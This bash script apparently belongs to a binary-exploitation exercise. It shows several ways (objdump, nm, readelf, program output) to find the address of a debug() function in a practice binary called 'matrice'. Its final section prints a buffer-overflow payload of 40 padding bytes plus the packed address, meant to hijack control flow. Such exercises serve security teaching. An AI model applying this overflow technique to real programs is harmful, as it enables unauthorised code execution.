#!/bin/bash
# Multiple methods to get the address of debug() function

echo "=== Methods to Get debug() Function Address ==="
echo ""

# Method 1: From program output (if program prints it)
echo "Method 1: Run the program and read the address"
echo "-----------------------------------------------"
echo "Run: ./matrice"
echo "Look for: 'Debug function address: 0x...'"
echo ""

# Method 2: Using objdump (Linux/macOS)
echo "Method 2: Using objdump"
echo "-----------------------------------------------"
if command -v objdump &> /dev/null; then
    echo "Debug function address (from objdump):"
    objdump -t matrice 2>/dev/null | grep " debug" || objdump -t matrice 2>/dev/null | grep "\.text.*debug"
    echo ""
else
    echo "objdump not found, skipping..."
    echo ""
fi

# Method 3: Using nm (symbol table)
echo "Method 3: Using nm (symbol table)"
echo "-----------------------------------------------"
if command -v nm &> /dev/null; then
    echo "Debug function address (from nm):"
    nm matrice 2>/dev/null | grep " debug" || nm matrice 2>/dev/null | grep " T.*debug"
    echo ""
else
    echo "nm not found, skipping..."
    echo ""
fi

# Method 4: Using readelf (Linux)
echo "Method 4: Using readelf (Linux)"
echo "-----------------------------------------------"
if command -v readelf &> /dev/null; then
    echo "Debug function address (from readelf):"
    readelf -s matrice 2>/dev/null | grep " debug"
    echo ""
else
    echo "readelf not found (Linux only), skipping..."
    echo ""
fi

# Method 5: Extract from program output automatically
echo "Method 5: Extract automatically from program"
echo "-----------------------------------------------"
DEBUG_ADDR=$(echo "" | ./matrice 2>&1 | grep -i "debug function address" | awk '{print $NF}')
if [ -n "$DEBUG_ADDR" ]; then
    echo "Found debug address: $DEBUG_ADDR"
    echo ""
    echo "To use this address in an exploit:"
    echo "python3 -c \"import struct,sys; sys.stdout.buffer.write(b'A'*40 + struct.pack('<Q', int('$DEBUG_ADDR', 16)))\" | ./matrice"
else
    echo "Could not extract address automatically"
    echo "Make sure the program prints the debug address"
fi

